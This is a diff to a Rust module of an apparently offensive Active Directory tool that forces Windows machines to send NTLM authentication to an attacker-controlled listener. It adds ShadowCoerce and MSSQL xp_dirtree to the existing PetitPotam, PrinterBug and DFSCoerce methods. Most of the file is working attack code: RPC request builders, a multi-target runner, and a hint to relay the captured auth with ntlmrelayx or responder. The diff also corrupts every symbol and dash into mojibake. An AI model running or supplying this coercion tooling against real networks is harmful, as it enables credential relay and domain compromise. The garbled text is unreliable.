@@ -1,8 +1,9 @@
-//! Authentication Coercion — Trigger NTLM authentication from a target
+//! Authentication Coercion â€” Trigger NTLM authentication from a target
 //! machine to an attacker-controlled listener using various RPC methods.
 //!
 //! Supported coercion techniques:
-//! - PetitPotam (MS-EFSR: EfsRpcOpenFileRaw)
+//! - PetitPotam (MS-EFSR: EfsRpcOpenFileRaw via SMB UNC)
+//! - ShadowCoerce (MS-EFSR: EfsRpcOpenFileRaw via WebDAV path)
 //! - PrinterBug / SpoolSample (MS-RPRN: RpcRemoteFindFirstPrinterChangeNotification)
 //! - DFSCoerce (MS-DFSNM: NetrDfsRemoveStdRoot / NetrDfsAddStdRoot)
 
@@ -13,18 +14,18 @@ use overthrone_core::proto::smb::SmbSession;
 use serde::{Deserialize, Serialize};
 use tracing::{debug, info, warn};
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Named pipe / RPC constants
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-/// MS-EFSR (Encrypting File System Remote) pipe — PetitPotam
+/// MS-EFSR (Encrypting File System Remote) pipe â€” PetitPotam
 const PIPE_EFSR: &str = "lsarpc";
 const PIPE_EFSR_ALT: &str = "efsrpc";
 
-/// MS-RPRN (Print System Remote) pipe — PrinterBug
+/// MS-RPRN (Print System Remote) pipe â€” PrinterBug
 const PIPE_SPOOLSS: &str = "spoolss";
 
-/// MS-DFSNM (DFS Namespace Management) pipe — DFSCoerce
+/// MS-DFSNM (DFS Namespace Management) pipe â€” DFSCoerce
 const PIPE_NETDFS: &str = "netdfs";
 
 /// EFSR RPC interface UUID
@@ -34,31 +35,37 @@ const RPRN_UUID: &str = "12345678-1234-abcd-ef00-0123456789ab";
 /// DFSNM RPC interface UUID
 const DFSNM_UUID: &str = "4fc742e0-4a10-11cf-8273-00aa004ae673";
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Configuration
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Coercion method to use
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 pub enum CoerceMethod {
-    /// EfsRpcOpenFileRaw (MS-EFSR) — PetitPotam
+    /// EfsRpcOpenFileRaw (MS-EFSR) via SMB UNC â€” PetitPotam
     PetitPotam,
-    /// RpcRemoteFindFirstPrinterChangeNotification (MS-RPRN) — PrinterBug
+    /// EfsRpcOpenFileRaw (MS-EFSR) via WebDAV path â€” ShadowCoerce
+    ShadowCoerce,
+    /// RpcRemoteFindFirstPrinterChangeNotification (MS-RPRN) â€” PrinterBug
     PrinterBug,
-    /// NetrDfsRemoveStdRoot (MS-DFSNM) — DFSCoerce
+    /// NetrDfsRemoveStdRoot (MS-DFSNM) â€” DFSCoerce
     DfsCoerce,
+    /// MSSQL xp_dirtree â€” directory enumeration triggers NTLM auth
+    XpDirtree,
 }
 
 impl std::fmt::Display for CoerceMethod {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         match self {
-            Self::PetitPotam => write!(f, "PetitPotam (MS-EFSR)"),
+            Self::PetitPotam => write!(f, "PetitPotam (MS-EFSR UNC)"),
+            Self::ShadowCoerce => write!(f, "ShadowCoerce (MS-EFSR WebDAV)"),
             Self::PrinterBug => write!(f, "PrinterBug (MS-RPRN)"),
             Self::DfsCoerce => write!(f, "DFSCoerce (MS-DFSNM)"),
+            Self::XpDirtree => write!(f, "XpDirtree (MSSQL)"),
         }
     }
 }
-
+/// Structure
 #[derive(Debug, Clone)]
 pub struct CoerceConfig {
     /// Target machine to coerce authentication from
@@ -71,6 +78,8 @@ pub struct CoerceConfig {
     pub methods: Vec<CoerceMethod>,
     /// UNC path format for the listener
     pub listener_path: Option<String>,
+    /// MSSQL port (for XpDirtree coercion)
+    pub mssql_port: u16,
 }
 
 impl Default for CoerceConfig {
@@ -81,38 +90,49 @@ impl Default for CoerceConfig {
             listener_port: 445,
             methods: vec![
                 CoerceMethod::PetitPotam,
+                CoerceMethod::ShadowCoerce,
                 CoerceMethod::PrinterBug,
                 CoerceMethod::DfsCoerce,
             ],
             listener_path: None,
+            mssql_port: 1433,
         }
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Result
-// ═══════════════════════════════════════════════════════════
-
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+/// Structure
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct CoerceResult {
+    /// Target domain FQDN
     pub target: String,
+    /// listener field
     pub listener: String,
+    /// methods attempted field
     pub methods_attempted: usize,
+    /// successful coercions field
     pub successful_coercions: Vec<CoercionAttempt>,
+    /// failed coercions field
     pub failed_coercions: Vec<CoercionAttempt>,
 }
-
+/// Structure
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct CoercionAttempt {
+    /// Execution method that produced this output.
     pub method: String,
+    /// pipe field
     pub pipe: String,
+    /// success field
     pub success: bool,
+    /// Error information
     pub error: Option<String>,
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // DCE/RPC PDU Construction
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Build a minimal DCE/RPC Bind request for an interface UUID
 fn build_rpc_bind(interface_uuid: &str, version_major: u16) -> Vec<u8> {
@@ -265,7 +285,13 @@ fn build_rpc_request(opnum: u16, stub_data: &[u8]) -> Vec<u8> {
 /// Parse a UUID string into NDR wire format (mixed-endian)
 fn parse_uuid_to_ndr(uuid_str: &str) -> Vec<u8> {
     let hex: String = uuid_str.replace('-', "");
-    let bytes = hex::decode(&hex).unwrap_or_else(|_| vec![0u8; 16]);
+    let bytes = hex::decode(&hex).unwrap_or_else(|e| {
+        warn!(
+            "Failed to parse UUID hex '{}': {} â€” using zeroed bytes",
+            uuid_str, e
+        );
+        vec![0u8; 16]
+    });
 
     let mut ndr = Vec::with_capacity(16);
     // First 3 groups: little-endian
@@ -278,9 +304,9 @@ fn parse_uuid_to_ndr(uuid_str: &str) -> Vec<u8> {
     ndr
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Coercion Execution
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 async fn try_coerce(
     smb: &SmbSession,
@@ -291,11 +317,18 @@ async fn try_coerce(
     let (pipe, uuid, version, request_builder): (&str, &str, u16, fn(&str) -> Vec<u8>) =
         match method {
             CoerceMethod::PetitPotam => (PIPE_EFSR, EFSR_UUID, 1, build_efsr_request),
+            CoerceMethod::ShadowCoerce => (PIPE_EFSR, EFSR_UUID, 1, build_efsr_request),
             CoerceMethod::PrinterBug => (PIPE_SPOOLSS, RPRN_UUID, 1, build_rprn_request),
             CoerceMethod::DfsCoerce => (PIPE_NETDFS, DFSNM_UUID, 3, build_dfsnm_request),
+            CoerceMethod::XpDirtree => unreachable!("XpDirtree is handled separately"),
         };
 
-    info!("  {} Trying {} via \\\\pipe\\{}", "→".cyan(), method, pipe);
+    info!(
+        "  {} Trying {} via \\\\pipe\\{}",
+        "â†’".cyan(),
+        method,
+        pipe
+    );
 
     // Step 1: RPC Bind
     let bind_pdu = build_rpc_bind(uuid, version);
@@ -343,7 +376,7 @@ async fn try_coerce(
         Ok(response) => {
             // Any response (even an error) often means coercion was triggered
             // The target attempts to connect back
-            // ── continuing from: match smb.pipe_transact(pipe, &request_pdu).await { Ok(response) => {
+            // â”€â”€ continuing from: match smb.pipe_transact(pipe, &request_pdu).await { Ok(response) => {
             // Check RPC response status
             // Response type 2 = Response PDU; last 4 bytes = return value
             let rpc_status = if response.len() >= 28 {
@@ -360,7 +393,7 @@ async fn try_coerce(
 
             // For coercion, even "access denied" (0x00000005) or
             // "bad network path" (0x00000035) means the target tried
-            // to reach our listener — coercion succeeded.
+            // to reach our listener â€” coercion succeeded.
             let coercion_triggered = matches!(
                 rpc_status,
                 0x00000000  // SUCCESS
@@ -375,14 +408,14 @@ async fn try_coerce(
 
             if coercion_triggered {
                 info!(
-                    "  {} {} — coercion triggered! (status: 0x{:08X})",
-                    "✓".green().bold(),
+                    "  {} {} â€” coercion triggered! (status: 0x{:08X})",
+                    "âœ“".green().bold(),
                     method.to_string().green(),
                     rpc_status
                 );
             } else {
                 debug!(
-                    "  {} {} — unexpected status: 0x{:08X}",
+                    "  {} {} â€” unexpected status: 0x{:08X}",
                     "?".yellow(),
                     method,
                     rpc_status
@@ -411,7 +444,7 @@ async fn try_coerce(
 
             if likely_triggered {
                 info!(
-                    "  {} {} — pipe broken (coercion likely triggered)",
+                    "  {} {} â€” pipe broken (coercion likely triggered)",
                     "~".yellow(),
                     method
                 );
@@ -422,7 +455,12 @@ async fn try_coerce(
                     error: Some(format!("Pipe error (likely success): {err_str}")),
                 }
             } else {
-                warn!("  {} {} — request failed: {}", "✗".red(), method, err_str);
+                warn!(
+                    "  {} {} â€” request failed: {}",
+                    "âœ—".red(),
+                    method,
+                    err_str
+                );
                 CoercionAttempt {
                     method: method.to_string(),
                     pipe: pipe.to_string(),
@@ -434,16 +472,19 @@ async fn try_coerce(
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Pipe Availability Check
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-/// Check which coercion-relevant named pipes are accessible on the target
+/// Check which coercion-relevant named pipes are accessible on the target.
+/// ShadowCoerce shares the same EFSR pipe as PetitPotam.
 async fn check_pipe_availability(smb: &SmbSession) -> Vec<(CoerceMethod, bool)> {
     let pipes_to_check = [
         (CoerceMethod::PetitPotam, vec![PIPE_EFSR, PIPE_EFSR_ALT]),
+        (CoerceMethod::ShadowCoerce, vec![PIPE_EFSR, PIPE_EFSR_ALT]),
         (CoerceMethod::PrinterBug, vec![PIPE_SPOOLSS]),
         (CoerceMethod::DfsCoerce, vec![PIPE_NETDFS]),
+        (CoerceMethod::XpDirtree, vec![]),
     ];
 
     let mut results = Vec::new();
@@ -469,7 +510,7 @@ async fn check_pipe_availability(smb: &SmbSession) -> Vec<(CoerceMethod, bool)> 
             }
         }
         debug!(
-            "Pipe check: {} — {}",
+            "Pipe check: {} â€” {}",
             method,
             if accessible { "available" } else { "not found" }
         );
@@ -479,9 +520,9 @@ async fn check_pipe_availability(smb: &SmbSession) -> Vec<(CoerceMethod, bool)> 
     results
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Listener Path Builder
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Build the UNC path that the target will be coerced into connecting to
 fn build_listener_path(listener: &str, custom_path: Option<&str>) -> String {
@@ -492,8 +533,7 @@ fn build_listener_path(listener: &str, custom_path: Option<&str>) -> String {
     format!("\\\\{}\\overthrone\\coerce.txt", listener)
 }
 
-/// Build WebDAV-style path for HTTP-based capture
-#[allow(dead_code)] // WebDAV path builder kept for future HTTP relay support
+/// Build WebDAV-style path for HTTP-based capture (ShadowCoerce)
 fn build_webdav_listener_path(listener: &str, port: u16) -> String {
     if port == 80 {
         format!("\\\\{}@80\\webdav\\coerce.txt", listener)
@@ -502,9 +542,9 @@ fn build_webdav_listener_path(listener: &str, port: u16) -> String {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
-// Scan Mode — Check which methods work WITHOUT triggering
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// Scan Mode â€” Check which methods work WITHOUT triggering
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Scan a target to determine which coercion methods are likely available
 /// (checks pipe accessibility without sending actual coercion requests)
@@ -517,12 +557,12 @@ pub async fn scan(config: &HuntConfig, target: &str) -> Result<Vec<(CoerceMethod
 
     for (method, available) in &results {
         let icon = if *available {
-            "✓".green()
+            "âœ“".green()
         } else {
-            "✗".red()
+            "âœ—".red()
         };
         info!(
-            "  {} {} — pipe {}",
+            "  {} {} â€” pipe {}",
             icon,
             method,
             if *available {
@@ -536,9 +576,9 @@ pub async fn scan(config: &HuntConfig, target: &str) -> Result<Vec<(CoerceMethod
     Ok(results)
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Multi-Target Coercion
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Attempt coercion against multiple targets in parallel
 pub async fn coerce_multiple(
@@ -562,13 +602,35 @@ pub async fn coerce_multiple(
         let sem = Arc::clone(&sem);
 
         handles.push(tokio::spawn(async move {
-            let _permit = sem.acquire().await.unwrap();
+            let _permit = match sem.acquire().await {
+                Ok(p) => p,
+                Err(e) => {
+                    warn!("Semaphore acquire failed in coerce_multiple: {e}");
+                    let t = target.clone();
+                    return (
+                        target,
+                        CoerceResult {
+                            target: t,
+                            listener: listener.clone(),
+                            methods_attempted: 0,
+                            successful_coercions: Vec::new(),
+                            failed_coercions: vec![CoercionAttempt {
+                                method: "connect".to_string(),
+                                pipe: String::new(),
+                                success: false,
+                                error: Some(format!("Semaphore error: {e}")),
+                            }],
+                        },
+                    );
+                }
+            };
             let cc = CoerceConfig {
                 target: target.clone(),
                 listener: listener.clone(),
                 listener_port: 445,
                 methods,
                 listener_path: None,
+                mssql_port: 1433,
             };
             let result = run(&config, &cc).await.unwrap_or_else(|e| CoerceResult {
                 target: target.clone(),
@@ -595,12 +657,20 @@ pub async fn coerce_multiple(
     results
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Public Runner
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 pub async fn run(config: &HuntConfig, cc: &CoerceConfig) -> Result<CoerceResult> {
-    info!("{}", "═══ AUTHENTICATION COERCION ═══".bold().red());
+    if cc.methods.contains(&CoerceMethod::XpDirtree) {
+        // MSSQL xp_dirtree uses a completely different protocol path
+        return crate::xp_dirtree::run(config, &cc.target, &cc.listener, cc.listener_port).await;
+    }
+
+    info!(
+        "{}",
+        "â•â•â• AUTHENTICATION COERCION â•â•â•".bold().red()
+    );
 
     if cc.target.is_empty() || cc.listener.is_empty() {
         return Err(OverthroneError::custom(
@@ -622,16 +692,22 @@ pub async fn run(config: &HuntConfig, cc: &CoerceConfig) -> Result<CoerceResult>
             OverthroneError::Smb(format!("Cannot connect to target '{}': {e}", cc.target))
         })?;
 
-    info!("  {} SMB session established", "✓".green());
+    info!("  {} SMB session established", "âœ“".green());
 
-    // Step 2: Build listener path
-    let listener_path = build_listener_path(&cc.listener, cc.listener_path.as_deref());
-    info!("  Listener UNC: {}", listener_path.yellow());
+    // Step 2: Build listener path (WebDAV for ShadowCoerce, UNC for others)
+    let has_shadow = cc.methods.contains(&CoerceMethod::ShadowCoerce);
+    let listener_path = if has_shadow {
+        build_webdav_listener_path(&cc.listener, cc.listener_port)
+    } else {
+        build_listener_path(&cc.listener, cc.listener_path.as_deref())
+    };
+    info!("  Listener path: {}", listener_path.yellow());
 
     // Step 3: Determine which methods to try
     let methods = if cc.methods.is_empty() {
         vec![
             CoerceMethod::PetitPotam,
+            CoerceMethod::ShadowCoerce,
             CoerceMethod::PrinterBug,
             CoerceMethod::DfsCoerce,
         ]
@@ -648,10 +724,10 @@ pub async fn run(config: &HuntConfig, cc: &CoerceConfig) -> Result<CoerceResult>
 
         if attempt.success {
             successful.push(attempt);
-            // Often one successful coercion is enough — the auth is in-flight
+            // Often one successful coercion is enough â€” the auth is in-flight
             info!(
                 "  {} Coercion successful! Check your listener at {}",
-                "★".green().bold(),
+                "â˜…".green().bold(),
                 cc.listener.bold().cyan()
             );
         } else {
@@ -666,24 +742,24 @@ pub async fn run(config: &HuntConfig, cc: &CoerceConfig) -> Result<CoerceResult>
     if successful.is_empty() {
         warn!(
             "  {} No coercion methods succeeded against {}",
-            "✗".red(),
+            "âœ—".red(),
             cc.target
         );
         info!("  Possible reasons:");
-        info!("    • Target is patched against known coercion methods");
-        info!("    • Required services (Spooler, EFSR, DFS) are disabled");
-        info!("    • Network filtering blocks SMB/RPC traffic");
-        info!("    • Insufficient privileges on the target");
+        info!("    â€¢ Target is patched against known coercion methods");
+        info!("    â€¢ Required services (Spooler, EFSR, DFS) are disabled");
+        info!("    â€¢ Network filtering blocks SMB/RPC traffic");
+        info!("    â€¢ Insufficient privileges on the target");
     } else {
         info!(
             "\n  {} {}/{} coercion methods succeeded",
-            "→".cyan(),
+            "â†’".cyan(),
             successful.len().to_string().green().bold(),
             methods.len()
         );
         info!(
             "  {} Capture NTLM auth with: ntlmrelayx / responder / overthrone-reaper",
-            "→".cyan()
+            "â†’".cyan()
         );
     }
 
@@ -696,9 +772,9 @@ pub async fn run(config: &HuntConfig, cc: &CoerceConfig) -> Result<CoerceResult>
     })
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Tests
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 #[cfg(test)]
 mod tests {
@@ -759,8 +835,16 @@ mod tests {
 
     #[test]
     fn test_coerce_method_display() {
-        assert_eq!(CoerceMethod::PetitPotam.to_string(), "PetitPotam (MS-EFSR)");
+        assert_eq!(
+            CoerceMethod::PetitPotam.to_string(),
+            "PetitPotam (MS-EFSR UNC)"
+        );
+        assert_eq!(
+            CoerceMethod::ShadowCoerce.to_string(),
+            "ShadowCoerce (MS-EFSR WebDAV)"
+        );
         assert_eq!(CoerceMethod::PrinterBug.to_string(), "PrinterBug (MS-RPRN)");
         assert_eq!(CoerceMethod::DfsCoerce.to_string(), "DFSCoerce (MS-DFSNM)");
+        assert_eq!(CoerceMethod::XpDirtree.to_string(), "XpDirtree (MSSQL)");
     }
 }
